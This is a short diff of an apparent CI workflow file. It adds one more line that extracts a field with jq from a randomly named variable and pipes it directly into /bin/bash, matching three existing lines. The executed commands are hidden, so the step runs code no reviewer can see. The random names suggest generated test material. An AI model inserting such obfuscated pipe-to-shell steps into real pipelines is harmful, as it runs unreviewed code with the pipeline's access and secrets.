@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$kuif796" | jq -r .yzlry62 | /bin/bash
           printf '%s' "$yl45418" | jq -r .bjkep61 | /bin/bash
           echo $g4 | jq -r .uuda693 | /bin/bash
+          printf '%s' "$z1" | jq -r .rxp83 | /bin/bash
 
       - name: Upload artifact
         if: always()
